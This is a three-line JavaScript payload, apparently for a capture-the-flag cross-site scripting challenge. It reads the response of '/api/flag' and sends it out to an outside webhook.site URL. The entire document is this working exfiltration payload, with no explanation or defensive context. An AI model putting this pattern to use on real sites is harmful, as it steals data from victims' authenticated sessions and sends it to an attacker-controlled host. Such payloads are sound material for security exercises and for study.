fetch('/api/flag')
  .then(res => res.text())
  .then(flag => fetch('https://webhook.site/d7728677-d8a7-4410-bc60-0f6320a74a1e?flag=' + encodeURIComponent(flag)));
